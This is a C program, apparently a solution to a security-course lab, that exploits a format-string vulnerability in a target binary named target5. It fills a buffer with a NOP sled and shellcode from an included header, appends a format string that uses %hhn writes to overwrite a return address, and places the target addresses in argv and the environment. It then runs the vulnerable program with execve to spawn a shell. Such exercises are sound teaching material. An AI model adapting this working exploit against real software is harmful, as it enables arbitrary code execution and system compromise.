#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define NOP 0x90
#define DUMMY "\xDE\xAD\xBE\xEF\xDE\xAD\xBE"
int main(void)
{
  char *args[3];
  char *env[19];

  char buf[256];
  char format [] = "%08x%08x%08x%08x%16x%hhn%154x%hhn%39x%hhn%255x%hhn";
  memset(buf,NOP,256);
  memcpy(buf+4,shellcode,strlen(shellcode));
  memcpy(buf+4+strlen(shellcode)+4-strlen(shellcode)%4,format,strlen(format));
  args[0] = TARGET;
  args[1] = "\x68\xfe\x21\x20";
  args[2] = NULL;
  env[0] = "";
  env[1] = "";
  env[2] = "";
  env[3] = DUMMY;

  env[4] = "\x69\xfe\x21\x20";
  env[5] = "";
  env[6] = "";
  env[7] = "";
  env[8] = DUMMY;

  env[9] = "\x6a\xfe\x21\x20";
  env[10] = "";
  env[11] = "";
  env[12] = "";
  env[13] = DUMMY;

  env[14] = "\x6b\xfe\x21\x20";
  env[15] = "";
  env[16] = "";
  env[17] = "";

  env[18] = buf;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
